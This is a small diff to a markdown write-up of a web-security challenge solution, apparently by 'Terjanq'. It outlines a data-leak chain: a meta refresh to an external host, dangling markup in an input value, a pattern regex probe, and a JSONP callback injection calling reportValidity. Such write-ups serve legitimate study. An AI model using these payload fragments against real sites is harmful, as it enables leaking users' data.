@@ -17,7 +17,7 @@ Some **Terjanq** words
 3. Allowed characters in JSONP: `/^[a-z.]+$/`
 
 ### Solution:
-0. Meta redirect (<meta http-equiv="refresh" content="0;//website.com">) to external page.
+0. Meta redirect (`<meta http-equiv="refresh" content="0;//website.com">`) to external page.
 1. Markup dangling in <input id=x value='DANGLED DATA.
 2. <input id=x pattern="something"> RegExp to retrieve data from value='.
 3. Callback in JSONP to inject: <script src="/hire?callback=x.reportValidity">.
